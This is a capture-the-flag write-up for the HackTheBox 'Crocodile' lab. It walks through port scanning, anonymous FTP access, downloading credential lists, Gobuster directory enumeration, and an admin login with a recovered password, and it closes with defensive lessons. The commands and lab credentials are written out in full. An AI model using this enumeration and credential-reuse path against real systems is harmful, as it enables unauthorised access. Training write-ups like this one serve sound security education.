# Crocodile

This is a HackTheBox Starting Point lab for practicing service enumeration, anonymous FTP access, credential discovery, web directory enumeration, and credential reuse against a login portal.

## Reconnaissance

Started with **RustScan** and **Nmap** to identify open ports and services on the target.

```bash
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified two open ports:

```text
21/tcp open  ftp   vsftpd 3.0.3
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
```

Nmap also reported that anonymous FTP login was allowed:

```text
ftp-anon: Anonymous FTP login allowed
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```

This immediately made FTP the first service to investigate.

---

## FTP Enumeration

Connected to the FTP service and logged in anonymously:

```bash
ftp $target
```

The login succeeded:

```text
Name (10.129.125.77:kali): anonymous
230 Login successful.
```

Listed all files:

```text
ftp> ls -la
```

Result:

```text
allowed.userlist
allowed.userlist.passwd
```

Downloaded both files:

```text
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

---

## Credential Discovery

The username list contained:

```text
aron
pwnmeow
egotisticalsw
admin
```

The password list contained:

```text
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

The exposed files provided usernames and candidate passwords that could be tested against the web login portal.

---

## Web Enumeration

The HTTP service on port `80` hosted an Apache website:

```text
Apache httpd 2.4.41 (Ubuntu)
```

Ran directory enumeration with **Gobuster**:

```bash
gobuster dir -u "http://$target/" -w /usr/share/wordlists/dirb/common.txt -t 64 -x php
```

Important results:

```text
config.php    (Status: 200) [Size: 0]
dashboard     (Status: 301)
login.php     (Status: 200)
logout.php    (Status: 302) [--> login.php]
```

The discovery of `login.php` gave a place to test the credentials recovered from FTP.

---

## Web Login

Accessed `login.php` in the browser and tested the recovered usernames and passwords.

The `admin` user successfully authenticated with one of the recovered passwords:

```text
Username: admin
Password: rKXM59ESxesUFHAd
```

After logging in, access to the dashboard was obtained and the lab flag was reached.

The source notes confirmed the flag was obtained, but the flag value itself was not recorded in the pasted material.

---

## Attack Path

```text
RustScan / Nmap
        ↓
FTP and HTTP Discovery
        ↓
Anonymous FTP Login
        ↓
User and Password List Download
        ↓
Web Directory Enumeration
        ↓
login.php Discovery
        ↓
Credential Reuse Against Web Login
        ↓
Dashboard Access
        ↓
Flag Retrieval
```

## Key Takeaways

* Anonymous FTP access can expose credential material that affects other services.
* Username and password lists should never be stored in publicly readable file shares.
* Credential reuse across FTP-exposed files and web login portals creates a direct compromise path.
* Directory enumeration is useful for discovering hidden application entry points such as `login.php` and `dashboard`.
* Even when FTP is not directly exploitable for code execution, exposed files can be enough to compromise another service.
